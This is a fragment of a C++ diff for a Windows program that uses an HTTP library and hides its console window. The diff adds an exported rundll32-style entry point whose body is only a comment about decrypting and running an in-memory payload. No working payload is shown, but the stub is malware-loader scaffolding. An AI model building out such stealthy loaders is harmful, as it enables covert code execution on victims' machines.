@@ -2,6 +2,11 @@
 #include <cpr/cpr.h>
 #include <windows.h>
 
+
+extern "C" __declspec(dllexport) void Start(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    // Decrypt and execute in-memory payload here
+}
+
 int main() {
 
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
